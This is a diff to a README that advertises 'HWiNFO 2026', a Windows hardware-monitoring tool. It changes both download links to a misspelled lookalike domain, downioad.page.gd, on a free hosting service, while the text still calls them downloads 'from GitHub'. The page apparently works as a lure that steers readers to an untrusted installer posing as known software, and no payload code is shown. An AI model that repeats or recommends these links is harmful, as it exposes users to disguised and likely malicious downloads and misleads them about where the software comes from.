@@ -2,7 +2,7 @@
 
 HWiNFO 2026 is a powerful software designed to provide detailed insights into your computer's hardware components. It offers real-time monitoring and comprehensive diagnostics to help you maintain and optimize your system performance. This version is tailored for Windows 10 and Windows 11 users, ensuring compatibility and efficiency.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -67,6 +67,6 @@ For additional support, visit the GitHub repository issues section or join our c
 
 ## Download
 
-For the latest version, visit the download page here: [Download the latest version from GitHub](https://download-page.page.gd/)
+For the latest version, visit the download page here: [Download the latest version from GitHub](https://downioad.page.gd/)
 
 Thank you for choosing HWiNFO for your hardware monitoring needs. Stay informed and keep your system at its best!
